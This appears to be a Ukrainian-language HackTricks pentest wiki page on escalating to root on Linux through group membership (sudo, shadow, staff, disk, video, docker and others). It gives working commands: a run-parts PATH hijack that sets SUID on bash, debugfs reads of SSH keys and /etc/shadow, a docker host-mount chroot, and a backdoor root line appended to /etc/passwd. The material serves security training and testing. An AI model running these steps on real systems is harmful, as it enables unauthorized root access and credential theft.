# Цікаві групи - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Групи Sudo/Admin

### **PE - Метод 1**

**Іноді** політика системи **/etc/sudoers** (або файл, включений до неї) містить такі записи:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Це означає, що будь-який користувач, який відповідає будь-якому із записів, може виконувати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:

```
sudo su
```

Якщо `sudo -l` дозволяє обмежений виклик `adduser` лише з іменем користувача, перевірте, чи створює він однойменну первинну групу, якої ще не існує. Новий обліковий запис у цій групі може отримати привілеї, якщо чинна політика sudoers уже надає їх `%group`; перш ніж вважати це шляхом до підвищення привілеїв, перевірте і створення групи, і правило для групи. Створення облікового запису змінює систему, тож спершу перевірте політику.

### PE - Метод 2

Знайдіть усі SUID-бінарні файли та перевірте, чи є серед них **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Якщо **pkexec є SUID-бінарним файлом**, він може виконати програму від імені іншого користувача лише тоді, коли polkit авторизує запитану дію; сам по собі біт SUID не гарантує доступу root. Перевірте встановлену політику та авторизацію цільового сеансу, а не припускайте, що членства в групі **sudo** або **admin** достатньо.<sup>[[4]](#references)[[5]](#references)</sup>

Для окремого шляху [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) спершу переконайтеся, що `pkexec` є виконуваним файлом, власником якого є **root**, і який має біт SUID. Встановлений бінарний файл без цього біта не відповідає локальному підвищенню привілеїв через SUID, описаному в рекомендації. Рядок версії з upstream — лише підказка: дистрибутиви можуть [переносити виправлення до старіших версій пакетів](https://ubuntu.com/security/CVE-2021-4034), тому перш ніж вважати пакет вразливим, перевірте встановлений пакет від виробника та наявні засоби пом’якшення.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) — це інший шлях у polkit: гонка авторизації D-Bus, а не вразливість SUID у `pkexec`. Перевірте встановлений пакет polkit від виробника та з’ясуйте, чи може доступна привілейована дія D-Bus внести корисні зміни; для створення облікового запису також потрібна відповідна служба, наприклад AccountsService, а доступ нової групи до sudo залежить від чинної політики sudo. Сама лише зазначена версія polkit або встановлена служба — це лише привід для перевірки, особливо з огляду на те, що виробники можуть [переносити виправлення](https://access.redhat.com/security/cve/cve-2021-3560). Пасивне збирання інформації не повинно запускати гонку.

У дистрибутивах, які досі використовують старий бекенд Local Authority, перевірте правила груп за допомогою:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Назви відповідних груп і типові значення залежать від дистрибутива; група корисна тут, лише якщо вона вказана в локальній політиці.<sup>[[5]](#references)</sup>

Щоб **стати root, можна виконати**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Якщо спробувати виконати **pkexec** і з’явиться ця **помилка**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

У SSH-сеансі без зареєстрованого агента автентифікації `pkexec` може завершитися помилкою, навіть якщо політика в інших випадках дозволяла б цю дію; у документації polkit `pkttyagent` описано як текстовий агент автентифікації для сеансів без графічного середовища. Точна поведінка залежить від версії та дистрибутива, тому перевірте локальну політику й налаштування агента. Один із варіантів обходу, про який повідомляли для певних версій NixOS, передбачає **2 різні SSH-сеанси**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL, що забороняє обліковому запису доступ до `su`, поширюється на цей виконуваний файл, а не на всі способи виконати дію, дозволену адміністратору. Якщо облікові дані адміністратора було отримано незалежно, перевірте, чи дозволяє ефективна політика polkit окрему дію, наприклад запуск тимчасової системної служби через `systemd-run`, яку саме особу приймає агент автентифікації та від імені якої особи працюватиме створена служба. [Polkit розрізняє автентифікацію як власника сеансу та як адміністратора](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), тоді як [systemd-run може запросити тимчасову службу в системного менеджера](https://systemd.io/CONTROL_GROUP_INTERFACE/). Запис в історії команд, встановлена команда чи доступний для читання файл політики самі по собі не підтверджують наявність дозволу або чинність облікових даних; пасивна перевірка не повинна надсилати облікові дані чи запускати юніт.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Група Wheel

Іноді політика sudoers також може містити такий запис:

```
%wheel	ALL=(ALL:ALL) ALL
```

Це означає, що будь-який користувач, який відповідає цьому запису, може виконати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:

```
sudo su
```

## Група shadow

У системах, де це дозволяють права доступу, користувачі з групи **shadow** можуть **читати** **/etc/shadow**; перевірте фактичний режим доступу та ACL на цільовій системі:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Отже, прочитайте файл і спробуйте зламати кілька хешів.

Коротке уточнення щодо стану блокування під час аналізу хешів:
- Записи з `!` або `*` зазвичай не дають змоги виконати інтерактивний вхід за паролем.
- `!hash` означає, що пароль було заблоковано; решта символів відповідає полю пароля до блокування.
- Поле, що містить `*`, не є дійсним хешем `crypt(3)` і забороняє вхід у UNIX за паролем; з нього не слід робити висновок, чи було раніше задано пароль.
Це корисно для класифікації облікових записів, навіть коли прямий вхід заблоковано.<sup>[[6]](#references)</sup>

## Група Staff

**staff**: Дозволяє користувачам додавати локальні зміни до системи (`/usr/local`) без привілеїв root (зауважте, що виконувані файли в `/usr/local/bin` містяться у змінній PATH будь-якого користувача й можуть «перекривати» однойменні виконувані файли в `/bin` і `/usr/bin`). Порівняйте з групою «adm», яка більше пов’язана з моніторингом і безпекою.<sup>[[2]](#references)[[7]](#references)</sup>

У конфігураціях Debian, де `/usr/local/bin` стоїть перед `/usr/bin` у `PATH` (як у прикладах нижче), команда без повного шляху спочатку запускає копію з `/usr/local/bin`; перевірте фактичне значення `PATH` на цільовій системі.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Якщо привілейований процес шукає команду без указання повного шляху в доступному для запису `/usr/local/bin`, підміна цієї команди може призвести до її виконання з привілеями процесу; перш ніж тестувати, перевірте фактичний шлях і спосіб запуску.

У системах Ubuntu `pam_motd` під час входу запускає виконувані скрипти через `run-parts --lsbsysinit` від імені root; завдання cron також можуть використовувати `run-parts`, але це залежить від дистрибутива й конфігурації.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Під час нового входу через SSH `pspy` може допомогти підтвердити, чи цей шлях справді викликається на цільовій системі; він може спостерігати за командними рядками процесів без прав root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Група disk

Членство в групі **disk** може надавати прямий доступ до блокових пристроїв і часто майже дорівнює **root access**; Debian описує його як майже еквівалентний root, але перевірте фактичні дозволи на пристрої та структуру сховища на цільовій системі.<sup>[[7]](#references)</sup>

До поширених шляхів до пристроїв належать `/dev/sd*`, але в NVMe та інших конфігураціях сховищ використовуються інші назви.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` працює з файловими системами ext2/ext3/ext4; шляхи на кшталт `/root` і `/etc/shadow`, наведені вище, — це файли у відкритій файловій системі, тоді як другий аргумент `dump` — це шлях виводу у файловій системі хоста.<sup>[[8]](#references)</sup> Наприклад, ця команда витягує `/tmp/asd1.txt` із відкритої файлової системи у `/tmp/asd2.txt` у файловій системі хоста:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Параметр `-w` відкриває файлову систему для читання й запису, а команда `write` копіює файл із хост-системи у відкриту файлову систему. Не використовуйте її для змонтованої активної файлової системи, оскільки прямі зміни можуть її пошкодити; за можливості працюйте з автономним образом.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Група video

За допомогою команди `w` можна дізнатися, **хто увійшов у систему**, і вона покаже такий результат.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Запис **tty1** позначає першу віртуальну консоль Linux; сам по собі він не доводить, що користувач фізично перебуває біля машини, особливо в контейнерах та інших середовищах.<sup>[[21]](#references)</sup>

У системах, де доступний для читання пристрій framebuffer, членство в групі **video** може надавати доступ до цього пристрою. В інтерфейсі framebuffer Linux `/dev/fb0` описано як доступний для читання пристрій пам’яті, який можна скопіювати, щоб зробити знімок екрана; шлях `/sys/class/graphics/fb0/virtual_size` доступний лише там, де присутній відповідний атрибут fbdev у sysfs, тому спершу перевірте цільову систему.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Якщо встановлена версія **GIMP** підтримує імпорт необроблених даних, відкрийте **`screen.raw`** за допомогою цього засобу імпорту; підтримка та елементи керування відрізняються залежно від версії та плагіна.<sup>[[22]](#references)</sup>

![Група дисків — група відео: щоб відкрити необроблене зображення, скористайтеся GIMP, виберіть файл screen.raw і встановіть тип файлу «Необроблені дані зображення»](<../../../images/image (463).png>)

Установіть ширину й висоту зображення відповідно до геометрії framebuffer; спробуйте доступні формати пікселів і типи зображень, доки зображення не стане розбірливим.<sup>[[9]](#references)</sup>

![Група дисків — група відео: змініть ширину й висоту на ті, що використовуються на екрані, і перевірте різні типи зображень (виберіть той, на якому екран видно найкраще)](<../../../images/image (317).png>)

## Група root

Членство в групі **root** не надає UID користувача root, але файли, що належать `root` і доступні для запису групі, усе одно можуть бути цікавими, якщо привілейовані служби або бібліотеки їх використовують. Перш ніж розглядати це як шлях підвищення привілеїв, перевірте фактичні права доступу до файлу та спосіб його використання.

**Перевірте, які файли можуть змінювати члени групи root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Група Docker

Членство в групі `docker` на стандартних інсталяціях із root-доступом надає доступ рівня root до демона Docker. Оскільки bind mounts за замовчуванням доступні для читання й запису, користувач, який може керувати цим демоном, може змонтувати `/` хоста в контейнер і змінювати файли хоста; це фактично надає root-доступ на хості.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Членство в групі може не збігатися між `/etc/group`, `/etc/gshadow` і токеном поточного процесу. Якщо користувач відсутній у виводі `id -nG`, але `newgrp docker` виконується успішно, перевірте групу, яку показує `id` у новій оболонці, і з’ясуйте, чи доступний сокет Docker для запису та чи обслуговує він демон із root-доступом. Сама назва групи не підтверджує наявність контролю над хостом. Обмежте тривалість будь-якої автоматизованої перевірки через `newgrp`, щоб запит пароля не зупинив перелік.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Нарешті, якщо вам не подобаються наведені вище пропозиції або вони з якоїсь причини не працюють (наприклад, через firewall для Docker API), завжди можна спробувати **запустити привілейований контейнер і виконати escape з нього**, як описано тут:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Якщо у вас є дозвіл на запис до сокета Docker, прочитайте [**цю статтю про підвищення привілеїв через зловживання сокетом Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Група lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Група Adm

Зазвичай **учасники** групи **`adm`** мають дозвіл **читати файли журналів** у _/var/log/_.\
Тому, якщо ви скомпрометували користувача з цієї групи, обов’язково **перегляньте журнали**.<sup>[[7]](#references)</sup>

## Групи Backup / Operator / lp / Mail

Ці групи мають значення, що залежать від служби та дистрибутива. У документації Debian для `backup` описано делеговане резервне копіювання та відновлення, для `lp` — служби друку, а для `mail` — `/var/mail`; тому перевіряйте локальні дозволи, перш ніж вважати членство в групі шляхом підвищення привілеїв.<sup>[[7]](#references)</sup>

Членство в цих групах часто є вектором **пошуку облікових даних**, а не прямим шляхом до root:
- **backup**: може відкривати доступ до архівів із конфігураціями, ключами, дампами БД або токенами.
- **operator**: операційний доступ, специфічний для платформи, який може призвести до витоку конфіденційних даних під час виконання.
- **lp**: черги та спул-файли друку можуть містити вміст документів.
- **mail**: поштові спули можуть містити посилання для скидання пароля, OTP-коди та внутрішні облікові дані.

Розглядайте членство в цих групах як знахідку з високим ризиком розкриття даних і перевіряйте повторне використання паролів і токенів.

## Група Auth

В OpenBSD, коли налаштовано S/Key, власником `/etc/skey` є `root:auth`, а для доступу до його записів потрібна група `auth`; записи YubiKey зберігаються в `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> У вразливій конфігурації OpenBSD 6.6 із увімкненими S/Key або YubiKey локальні користувачі з привілеями `auth` могли отримати права root; Qualys описує необхідні умови та ланцюжок експлуатації, а пов’язаний PoC реалізує його.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Автентифікація pkexec/pkttyagent без сеансу GUI (проблема NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Системні групи — Вікі Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — сторінки довідки Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — сторінка довідки Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Посібник із захисту Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — сторінка довідки Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Пристрій framebuffer — документація ядра Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — сторінки довідки Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — сторінки довідки Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — спостереження за процесами Linux без привілеїв](https://github.com/DominicBreuker/pspy)
- [13] [Безпека Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Керування Docker без прав root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Запуск контейнерів — документація Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — сторінки довідки OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — сторінки довідки OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Вразливості автентифікації в OpenBSD — рекомендація з безпеки Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC локальної експлуатації](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — сторінка довідки Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Призначені пристрої Linux (версія 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Імпорт і експорт зображень — документація GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
